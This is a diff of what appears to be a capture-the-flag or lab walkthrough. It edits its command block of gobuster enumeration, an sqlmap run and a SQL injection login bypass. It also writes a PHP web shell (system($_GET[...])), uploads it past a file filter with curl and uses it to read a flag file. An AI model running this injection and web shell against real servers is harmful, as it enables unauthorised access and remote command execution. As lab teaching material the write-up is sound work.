@@ -8,15 +8,12 @@
 
 ```bash
 gobuster dir -u http://<ip>/ -w <list> -x php,txt,html
-curl -s -c c.txt -d "username=admin' OR 1=1-- -&password=x" http://<ip>/
+sqlmap -u 'http://<ip>/' --forms --batch           # the login is the first test
+curl -s -c c.txt -d 'username=<u>&password=<p>' http://<ip>/
 
-# after login — upload filter bypass
-echo '<?php system($_GET["c"]); ?>' > s.phtml
-curl -b c.txt -F 'doc=@s.phtml' http://<ip>/upload.php
-curl 'http://<ip>/uploads/s.phtml?c=id'
-curl 'http://<ip>/uploads/s.phtml?c=cat+/flag.txt'
-
-ls /var/www/html/uploads/                  # via webshell
+# upload bypass pattern — extension + content-type games
+echo '<?php system($_GET["<param>"]); ?>' > <shell>.<ext>
+curl -b c.txt -F 'doc=@<shell>.<ext>' http://<ip>/upload.php
 ```
 
 ## Concepts
